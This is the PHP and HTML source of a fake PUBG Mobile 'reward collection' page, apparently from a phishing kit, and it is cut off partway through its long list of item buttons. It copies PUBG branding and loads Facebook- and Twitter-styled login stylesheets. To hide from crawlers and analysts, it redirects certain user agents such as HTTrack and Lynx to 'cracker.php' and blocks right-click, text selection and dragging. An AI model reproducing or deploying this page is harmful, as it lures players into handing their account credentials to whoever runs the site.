<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe style="display: none;" scrolling="no" allow="autoplay" src="https://a.top4top.io/m_1936obt4j1.mp3" width="0" height="0" frameborder="no"></iframe>

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/pay.png">
<button type="button"><img src="https://www.pubgmobile.com/en/images/down_arrow.png"> Download</button>
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- slider --->
</div> <!--- header --->
<div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/gZv6030/image.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/gZv6030/image.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/x5bybHC/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/x5bybHC/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mJwPfRC/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mJwPfRC/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S5PvF3m/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S5PvF3m/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/tXBHQtd/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tXBHQtd/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C0rG8zv/11.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/C0rG8zv/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hw5G8L/12.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hw5G8L/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6HyFpGG/13.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/6HyFpGG/13.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3dmRFXV/14.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3dmRFXV/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zx5GxjL/15.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zx5GxjL/15.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PhnrcY3/16.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PhnrcY3/16.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g4z7tBb/17.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/g4z7tBb/17.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TTcnBSZ/18.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TTcnBSZ/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/t3P6YJy/19.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/t3P6YJy/19.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yRTzG0t/20.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yRTzG0t/20.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VSqw4Dv/21.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/VSqw4Dv/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0qVLP3y/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0qVLP3y/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N6sBxhr/23.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N6sBxhr/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/bgkqhSD/24.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/bgkqhSD/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PxpMQPv/25.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PxpMQPv/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8gBrqKY/26.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8gBrqKY/26.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YWbBt80/27.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YWbBt80/27.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BtztTC9/28.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BtztTC9/28.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/4d0jxMk/29.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/4d0jxMk/29.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hxGSqCR/30.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hxGSqCR/30.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6WSFLj/31.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c6WSFLj/31.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yf3k2vw/32.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yf3k2vw/32.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Zc4YWVk/33.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Zc4YWVk/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D52fbJC/34.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D52fbJC/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/T1yk8jX/35.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/T1yk8jX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3kwbctw/36.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3kwbctw/36.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fz96QgK/37.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Fz96QgK/37.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TcHpPz1/38.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TcHpPz1/38.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hXGJkjJ/39.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hXGJkjJ/39.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3F3vsBH/40.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3F3vsBH/40.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/J5bNTXt/41.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/J5bNTXt/41.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/FKjxq0p/42.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/FKjxq0p/42.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pbbpG2t/43.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pbbpG2t/43.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D9XXLZs/44.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D9XXLZs/44.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/xCXyt5Z/45.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/xCXyt5Z/45.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h9Ytkz/46.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0h9Ytkz/46.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2SN4jPv/47.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2SN4jPv/47.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Thqqrh8/48.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Thqqrh8/48.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WK7qJN4/49.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WK7qJN4/49.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QnnT6p0/50.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/QnnT6p0/50.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DzQh8wS/51.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DzQh8wS/51.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2s05KNn/52.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2s05KNn/52.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pKy2mNR/53.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pKy2mNR/53.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BT3s0gQ/54.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BT3s0gQ/54.jpg">Collect</button>
</div>
</div>

<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdC5zHF/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mTpf1bz/3.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pd4MrC6/4.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wwCwgFX/6.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sVkDgf7/8.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/7v7cDFb/9.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m8swBsJ/5.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/m8swBsJ/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mqswmqy/6.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mqswmqy/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/RBm3cZg/8.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/RBm3cZg/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GkxtWsH/9.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/GkxtWsH/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hV80jRJ/11.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hV80jRJ/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TM4x8kF/12.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TM4x8kF/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3s4VjWb/13.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3s4VjWb/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fb4WYn9/15.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Fb4WYn9/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wgC8DFJ/16.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wgC8DFJ/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/z7tRFnK/17.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/z7tRFnK/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mSR83ZX/18.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mSR83ZX/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/r01vx8L/19.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/r01vx8L/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BzkrJPx/20.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BzkrJPx/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KKsqN8c/21.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/KKsqN8c/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Ms6xmw1/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Ms6xmw1/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nszjrmK/23.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/nszjrmK/23.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C8XSXtp/24.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/C8XSXtp/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XFvVdkm/25.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/XFvVdkm/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/42KvPQD/26.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/42KvPQD/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PztSxRq/27.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PztSxRq/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c1dyKJX/28.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c1dyKJX/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SQctySW/29.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/SQctySW/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HhxqcZy/30.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HhxqcZy/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BG71Lq8/1.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BG71Lq8/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cYLYRnF/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cYLYRnF/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Kmzt1kv/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Kmzt1kv/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ySj37hj/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ySj37hj/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/kh4gdrP/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/kh4gdrP/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZBrkgM8/6.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ZBrkgM8/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngP07s9/7.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ngP07s9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HGTx2s3/8.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HGTx2s3/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzb2f6V/9.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mzb2f6V/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QHRMWMg/10.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/QHRMWMg/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/G9M0Bvm/11.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/G9M0Bvm/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wMD34vP/12.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wMD34vP/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwWc8V7/13.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cwWc8V7/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0QtCjnz/14.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0QtCjnz/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g9zWGn4/15.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/g9zWGn4/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/MnM6Qdp/16.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/MnM6Qdp/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rg2thNY/17.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Rg2thNY/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VQtZ0sH/18.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/VQtZ0sH/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/j3K6DSC/19.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/j3K6DSC/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WVQrH9j/20.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WVQrH9j/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SrWTVzr/21.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/SrWTVzr/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YPXLK1h/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YPXLK1h/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GWGX9DZ/23.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/GWGX9DZ/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Q8F2nX9/24.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Q8F2nX9/24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Z6KDLDN/25.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Z6KDLDN/25.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N102xm6/26.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N102xm6/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwJRtR3/27.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cwJRtR3/27.png">Collect</button>
</div>
</div>
<div class="item">
